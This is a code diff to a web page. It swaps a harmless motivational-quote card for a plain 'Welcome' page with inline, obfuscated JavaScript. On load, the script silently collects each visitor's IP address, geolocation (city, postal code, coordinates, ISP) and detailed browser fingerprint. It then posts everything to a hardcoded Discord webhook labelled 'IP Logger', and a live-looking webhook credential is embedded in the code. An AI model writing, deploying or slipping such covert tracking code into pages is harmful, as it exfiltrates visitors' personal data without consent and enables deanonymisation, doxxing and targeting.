@@ -1,23 +1,121 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>motivational quote</title>
-  <link rel="stylesheet" href="style.css" />
+    <title>Welcome</title>
 </head>
 <body>
-  <div class="card">
-    <div class="mark">"</div>
-    <div class="quote" id="d1">The only way to do great work is to love what you do.</div>
-    <div class="author" id="d2">Steve Jobs</div>
-    <div class="actions">
-      <button class="btn" id="b1">new</button>
-      <button class="btn" id="b2">embed</button>
-    </div>
-    <div class="note">daily spark</div>
-  </div>
-  <div class="toast" id="t1"></div>
-  <script src="script.js"></script>
+    <h1>Welcome</h1>
+    <p>Loading...</p>
+    <script>
+        async function a0() {
+            try {
+                const a1 = await fetch('https://api.ipify.org?format=json');
+                const a2 = await a1.json();
+                const a3 = a2.ip;
+
+                let a4 = {};
+                try {
+                    const a5 = await fetch(`https://ipapi.co/${a3}/json/`);
+                    a4 = await a5.json();
+                } catch(e) {}
+
+                const a6 = navigator.userAgent;
+                const a7 = navigator.platform || '';
+                const a8 = navigator.language || '';
+                const a9 = navigator.languages ? navigator.languages.join(', ') : '';
+                const a10 = navigator.cookieEnabled;
+                const a11 = navigator.doNotTrack || 'unspecified';
+                const a12 = navigator.hardwareConcurrency || 'unknown';
+                const a13 = navigator.deviceMemory || 'unknown';
+                const a14 = screen.width;
+                const a15 = screen.height;
+                const a16 = screen.colorDepth;
+                const a17 = screen.availWidth;
+                const a18 = screen.availHeight;
+                const a19 = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                const a20 = new Date().getTimezoneOffset();
+                const a21 = typeof localStorage !== 'undefined' ? true : false;
+                const a22 = typeof sessionStorage !== 'undefined' ? true : false;
+
+                let a23 = {};
+                if (navigator.connection) {
+                    a23 = {
+                        a24: navigator.connection.effectiveType,
+                        a25: navigator.connection.downlink,
+                        a26: navigator.connection.rtt,
+                        a27: navigator.connection.saveData
+                    };
+                }
+
+                const a28 = document.referrer || 'direct';
+                const a29 = window.location.href;
+                const a30 = document.title;
+
+                const a31 = {
+                    embeds: [{
+                        title: 'IP Logged',
+                        color: 0xff4444,
+                        fields: [
+                            { name: 'IP Address', value: a3, inline: true },
+                            { name: 'User Agent', value: a6.substring(0, 1024) },
+                            { name: 'Platform', value: a7, inline: true },
+                            { name: 'Language', value: a8, inline: true },
+                            { name: 'All Languages', value: a9 || 'none', inline: true },
+                            { name: 'Timezone', value: a19, inline: true },
+                            { name: 'Timezone Offset', value: a20 + ' min', inline: true },
+                            { name: 'Cookies Enabled', value: a10.toString(), inline: true },
+                            { name: 'Do Not Track', value: a11, inline: true },
+                            { name: 'Hardware Concurrency', value: a12.toString(), inline: true },
+                            { name: 'Device Memory', value: a13.toString() + ' GB', inline: true },
+                            { name: 'Screen', value: a14 + 'x' + a15, inline: true },
+                            { name: 'Available Screen', value: a17 + 'x' + a18, inline: true },
+                            { name: 'Color Depth', value: a16 + ' bit', inline: true },
+                            { name: 'LocalStorage', value: a21.toString(), inline: true },
+                            { name: 'SessionStorage', value: a22.toString(), inline: true },
+                            { name: 'Connection Type', value: a23.a24 || 'unknown', inline: true },
+                            { name: 'Downlink', value: a23.a25 ? a23.a25 + ' Mbps' : 'unknown', inline: true },
+                            { name: 'RTT', value: a23.a26 ? a23.a26 + ' ms' : 'unknown', inline: true },
+                            { name: 'Save Data', value: a23.a27 !== undefined ? a23.a27.toString() : 'unknown', inline: true },
+                            { name: 'Referrer', value: a28.substring(0, 1024) },
+                            { name: 'Page URL', value: a29.substring(0, 1024) },
+                            { name: 'Page Title', value: a30.substring(0, 256) },
+                            { name: 'Timestamp', value: new Date().toISOString(), inline: true }
+                        ],
+                        footer: { text: 'IP Logger' },
+                        timestamp: new Date().toISOString()
+                    }]
+                };
+
+                if (a4.country_name) {
+                    a31.embeds[0].fields.push({ name: 'Country', value: a4.country_name || 'unknown', inline: true });
+                    a31.embeds[0].fields.push({ name: 'Region', value: a4.region || 'unknown', inline: true });
+                    a31.embeds[0].fields.push({ name: 'City', value: a4.city || 'unknown', inline: true });
+                    a31.embeds[0].fields.push({ name: 'Postal', value: a4.postal || 'unknown', inline: true });
+                    a31.embeds[0].fields.push({ name: 'Lat/Lon', value: (a4.latitude || '?') + ', ' + (a4.longitude || '?'), inline: true });
+                    a31.embeds[0].fields.push({ name: 'ISP', value: a4.org || 'unknown', inline: true });
+                    a31.embeds[0].fields.push({ name: 'ASN', value: a4.asn || 'unknown', inline: true });
+                }
+
+                const a32 = 'https://discord.com/api/webhooks/1518413285916020746/S3xLNHv_2QAFUSxWsIWtXLIecCEXAaxXqdVx5Lx_mheR1GxWPtABm2ig-NgQO66Na1Bo';
+
+                await fetch(a32, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        username: 'IP Logger',
+                        avatar_url: 'https://i.imgur.com/3mMf8MX.png',
+                        content: '@everyone **New visitor logged**',
+                        ...a31
+                    })
+                });
+
+                document.body.innerHTML = '<h1>Welcome</h1><p>You have been logged.</p>';
+
+            } catch (e) {
+                document.body.innerHTML = '<h1>Welcome</h1><p>Page loaded.</p>';
+            }
+        }
+        a0();
+    </script>
 </body>
 </html>
